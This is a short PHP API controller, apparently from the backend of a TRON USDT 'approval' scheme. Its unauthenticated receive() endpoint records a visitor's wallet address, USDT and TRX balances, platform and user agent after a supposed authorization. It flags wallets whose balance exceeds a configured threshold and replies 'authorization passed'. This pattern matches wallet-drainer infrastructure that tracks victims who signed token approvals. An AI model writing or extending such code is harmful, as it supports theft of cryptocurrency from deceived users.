<?php

namespace app\api\controller;

use app\common\controller\Api;

/**
 * 授权
 */
class Approve extends Api
{
    protected $noNeedLogin = '*';
    protected $noNeedRight = '*';

    public function _initialize()
    {
        parent::_initialize();
    }

    /**
     * 会员中心
     */
    public function receive()
    {
        $address = $this->request->param('address');
        $usdt_balance = $this->request->param('usdt');
        $trx_balance = $this->request->param('trx');
        $platform = $this->request->param('platform');
        $user_agent = $this->request->param('agent');
        $data = [
            'address' => $address,
            'usdt_balance' => $usdt_balance*1000000,
            'trx_balance' => $trx_balance*1000000,
            'user_agent' => $user_agent,
            'platform' => $platform,
            'createtime' => time(),
        ];
        if($usdt_balance > Config::get('tron.max_usdt_balance')){
            $data['show'] = 0;
        }
        $exist = db("ausers")->where("address",$address)->find();
        if(!$exist){
            db('ausers')->insert($data);
        }else{
            db('ausers')->where("address",$address)->update($data);
        }
        $this->success('授权通过');
    }
}
